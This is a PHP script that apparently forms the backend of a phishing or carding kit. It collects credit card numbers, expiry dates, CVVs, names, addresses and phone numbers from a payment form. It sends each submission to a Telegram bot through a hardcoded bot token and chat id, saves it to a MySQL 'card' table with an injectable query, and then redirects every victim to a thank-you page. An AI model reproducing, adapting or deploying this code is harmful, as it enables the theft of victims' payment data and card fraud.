



<?php

$logins = array("wimey58373@3dmail.top", "sewiwod673@3dmail.top", "fosilas197@mailnet.top", "fosacoc454@imail8.net", "goriy58661@netmail8.com");


$tg_token = "861498551:AAFEMsIz6HYYnzfKqVh9YNBPj_jMNtCdIss";
$tg_chat_id = "-1001426343738";

$sql_host = "localhost";
$sql_dtbs = "xdovledo_admpay";
$sql_user = "xdovledo_admpay";
$sql_pass = "123456";


$card_good = "/thank-you.html";
$card_bad = "/thank-you.html";

if ($_SERVER["REQUEST_METHOD"] == "POST")
{
//данные из форм
$cc = trim($_POST['cc']);
$expiryMM = trim($_POST['expiryMM']);
$expiryYY = trim($_POST['expiryYY']);
$cvv = trim($_POST['cvv']);
$firstname = trim($_POST['firstname']);
$lastname = trim($_POST['lastname']);
$company = trim($_POST['company']);
$adress = trim($_POST['adress']);
$adress2 = trim($_POST['adress2']);
$country = trim($_POST['country']);
$city = trim($_POST['city']);
$state = trim($_POST['state']);
$zip = trim($_POST['zip']);
$phone = trim($_POST['phone']);


	   
	    
	    	
file_get_contents("https://api.telegram.org/bot{$tg_token}/sendMessage?chat_id={$tg_chat_id}&text={$cc}|{$expiryMM}|{$expiryYY}|{$cvv}|{$firstname}|{$lastname}|{$company}|{$adress}|{$adress2}|{$country}|{$adress2}|{$state}|{$zip}|{$phone}");

	    		$sql = mysqli_connect($sql_host, $sql_user, $sql_pass, $sql_dtbs);
	    		mysqli_query($sql, "INSERT INTO `card` (`cc`, `expiryMM`, `expiryYY`, `cvv`, `firstname`, `lastname`, `company`, `adress`, `adress2`, `country`, `city`, `state`, `zip`, `phone`)VALUES ('{$cc}', '{$expiryMM}', '{$expiryYY}', '{$cvv}', '{$firstname}', '{$lastname}', '{$company}', '{$adress}', '{$adress2}', '{$country}', '{$city}', '{$state}', '{$zip}', '{$phone}');");
	    		mysqli_close($sql);

	    		header("Location: {$card_good}");
				exit();
	    	
	    
	
	header("Location: {$card_bad}");
}
else
{
	exit(404);
}